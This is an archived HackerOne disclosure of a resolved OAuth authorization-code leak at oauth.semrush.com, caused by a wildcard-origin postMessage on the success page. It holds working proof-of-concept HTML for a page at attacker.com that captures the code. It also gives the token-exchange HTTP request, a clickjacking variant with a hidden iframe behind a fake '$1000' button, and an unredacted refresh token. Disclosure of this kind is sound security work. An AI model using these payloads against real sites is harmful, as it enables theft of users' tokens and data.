---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/improper-authentication-generic
  - env/web
substate: "resolved"
weakness: "Improper Authentication - Generic"
enriched: true
body: true
date: 2018-04-17
submitted: 2018-02-10T19:34:59.147Z
bounty_usd: null
votes: 70
cve: []
program: "[[programs/semrush|Semrush]]"
reporter: "nikitastupin"
source: "https://hackerone.com/reports/314814"
title: "[oauth token leak] at oauth.semrush.com"
---
# [oauth token leak] at oauth.semrush.com

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 70 | **Program:** Semrush | **Disclosed:** 2018-04-17

- Report: [https://hackerone.com/reports/314814](https://hackerone.com/reports/314814)
- CWE: Improper Authentication - Generic
- Submitted: 2018-02-10T19:34:59.147Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Domain, site, application
---
oauth.semrush.com

Steps to reproduce
---
1) Create following html at attacker.com/postmessage.html

```
<script>
  function listener(event) {
    alert(JSON.stringify(event.data));
  }

  var dest = window.open("https://oauth.semrush.com/oauth2/authorize?response_type=code&scope=user.info,projects.info,siteaudit.info&client_id=seoquake&redirect_uri=https%3A%2F%2Foauth.semrush.com%2Foauth2%2Fsuccess&state=636e7bae-22ed-407d-8d62-1d49b49ec962");
  
  window.addEventListener("message", listener);
</script>
```
2) Go to attacker.com/postmessage.html (make sure you are logged in at www.semrush.com)
3) Click "Approve"
4) Go to tab with attacker.com, you will see alert with `code`
5) Make POST request with obtained `code`
```
POST /oauth2/access_token HTTP/1.1
Host: oauth.semrush.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: */*
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-type: application/x-www-form-urlencoded
Content-Length: 205
DNT: 1
Connection: close

client_id=seoquake&client_secret=██████████&grant_type=authorization_code&code=[COPY OBTAINED CODE HERE]&redirect_uri=https%3A%2F%2Foauth.semrush.com%2Foauth2%2Fsuccess
```
6) Receive response with `access token` and `refresh token`
```
HTTP/1.1 200 OK
Server: nginx
Content-Type: application/json
Connection: close
Cache-Control: no-cache
Date: Sat, 10 Feb 2018 19:06:38 GMT
Set-Cookie: session=████; expires=Sat, 10-Feb-2018 21:06:38 GMT; Max-Age=7200; path=/; httponly

{"access_token":"███████","token_type":"Bearer","expires_in":604800,"refresh_token":"kiAMXIrTVjfvD131wraCjTLN4CzS7ABhqUGvweYC"}
```

Actual results
---
`access token` and `refresh token` of victim:
```
{"access_token":"██████████","token_type":"Bearer","expires_in":604800,"refresh_token":"kiAMXIrTVjfvD131wraCjTLN4CzS7ABhqUGvweYC"}
```

PoC, exploit code, screenshots, video, references, additional resources
---
This vulnerability is possible due to lack of `window.opener` origin check at `https://oauth.semrush.com/oauth2/success`:
```
<script>
	if (window.opener && typeof opener.postMessage === 'function') {
		opener.postMessage({ type: 'semrush:oauth:success', url: location.href }, '*');
	}
</script>
```
Meaning any site that opens `https://oauth.semrush.com/oauth2/success` may read `code` in `location.href`.

Attack vector based on fact that user sees SEOquake authorization page F262215 thinking that it's just official application permission request and with high probability clicks "Approve".

Still working at vector without this small user interaction.

## Impact

OAuth tokens leakage. This leads to user sensitive information leakage.
**Note**: it's not necessary to install SEOquake plugin!

P.S.
---
I'm aware of user info leakage, project info leakage and Site Audit info leakage but maybe there is wider scope of possible sensitive info leak.

I've reported vulnerability as soon as possible therefore no time to deeper scope research.

## Timeline

- **Report Filed**
- **2018-02-10** @nikitastupin: I've written new exploit which increases a probability of victim to click (note: that exploit uses fact that there is no `X-Frame-Options` header at `oauth.semrush.com`:
```
<button style="position:absolute;bottom:140px;right:530px;height:30px;width:70px;background-color:red" frameBorder="0">Get $1000!</button>
<iframe name="theFrame" style="width:100%;height:100%;opacity:0;overflow: hidden;"></iframe>
<script>

  function listener(event) {
    alert(JSON.stringify(event.data));
  }

  var dest = window.open("https://oauth.semrush.com/oauth2/authorize?response_type=code&scope=user.info,projects.info,siteaudit.info&client_id=seoquake&redirect_uri=https%3A%2F%2Foauth.semrush.com%2Foauth2%2Fsuccess&state=636e7bae-22ed-407d-8d62-1d49b49ec962", "theFrame");
  
  window.addEventListener("message", listener);
  console.log(window.elementFromPoint(869, 656));
</script>
```
1) Victim goes to `attacker.com/postmessage.html` and sees  F262227
2) Victim clicks on button to get $1000 but in fact clicks on "Approve"
3) Attacker gets `code`  F262226
- **2018-02-12** @alla: Thanks for the report, we will investigate this.
- **Report Triaged**
- **2018-02-21** @nikitastupin: Any updates?
- **2018-02-22** @alla: We'll inform you about any updates. Thank you for your patience.
- **Bounty Awarded**
- **2018-02-28** @nikitastupin: Hi,
Thanks for bounty! Looking for more vulnerabilities!

Is this bounty for oauth token leak only or for oauth token leak plus clickjacking?
- **2018-03-17** @alla: Could you please check the fix?
- **2018-03-18** @nikitastupin: It's fixed.

What about my question above?
- **Report Resolved**
- **2018-03-18** @alla: We'll answer very soon. Thank you for your patience.
- **Bounty Awarded**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
